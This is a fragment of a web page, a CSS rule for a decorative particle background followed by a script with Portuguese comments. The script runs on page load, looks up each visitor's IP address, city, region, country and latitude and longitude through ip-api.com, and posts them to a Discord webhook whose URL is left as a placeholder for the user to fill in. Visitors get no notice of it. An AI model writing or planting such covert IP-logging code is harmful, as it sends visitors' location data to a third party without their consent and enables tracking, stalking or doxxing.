        #particle-canvas {

            width: 100vw;
            height: 100vh;
            z-index: -1;

        <script>
        // URL do Webhook do Discord (substitua pelo seu)
        const discordWebhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";

        // Função para enviar as informações para o Discord
        function sendToDiscord(ip, locationData) {
            const message = {
                content: `Novo visitante com o IP: ${ip}\nLocalização: ${locationData.city}, ${locationData.region}, ${locationData.country}\nLatitude: ${locationData.lat}, Longitude: ${locationData.lon}`
            };

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Mensagem enviada para o Discord:', data);
            })
            .catch(error => {
                console.error('Erro ao enviar dados para o Discord:', error);
            });
        }

        // Função para obter informações detalhadas sobre o IP usando a API ip-api
        fetch('http://ip-api.com/json')
            .then(response => response.json())  // Converte a resposta para JSON
            .then(data => {
                const ip = data.query;  // O IP do visitante
                const locationData = {
                    city: data.city,     // Cidade
                    region: data.region, // Região
                    country: data.country, // País
                    lat: data.lat,       // Latitude
                    lon: data.lon        // Longitude
                };
                
                // Envia as informações para o Discord
                sendToDiscord(ip, locationData);
            })
            .catch(error => {
                console.error('Erro ao obter informações sobre o IP:', error);
            });
    </script>
